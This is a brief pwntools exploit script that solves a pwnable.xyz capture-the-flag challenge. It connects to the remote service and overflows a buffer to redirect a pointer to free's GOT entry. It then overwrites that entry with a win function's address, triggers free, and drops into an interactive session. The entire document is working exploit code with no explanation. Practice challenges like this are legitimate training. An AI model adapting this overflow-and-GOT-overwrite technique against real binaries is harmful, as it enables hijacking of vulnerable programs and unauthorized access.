#!/usr/bin/python
from pwn import *

free_got_address = 0x601210
win_func = 0x40093c

# proc = process("./challenge")
proc = remote("svc.pwnable.xyz", 30016)

# Fisrt overflow and write free's GOT addr to buf
print proc.read()
proc.writeline("1")
print proc.read()
proc.writeline("40")
print proc.read()
proc.write("A" * 0x20 + p64(free_got_address))

# Then, write win function's address to free's GOT
print proc.read()
proc.writeline("2")
print proc.read()
proc.write(p64(win_func))

# Call free
print proc.read()
proc.writeline("1")
print proc.read()
proc.writeline("10")
print proc.read()
proc.writeline("nothing")

proc.interactive()

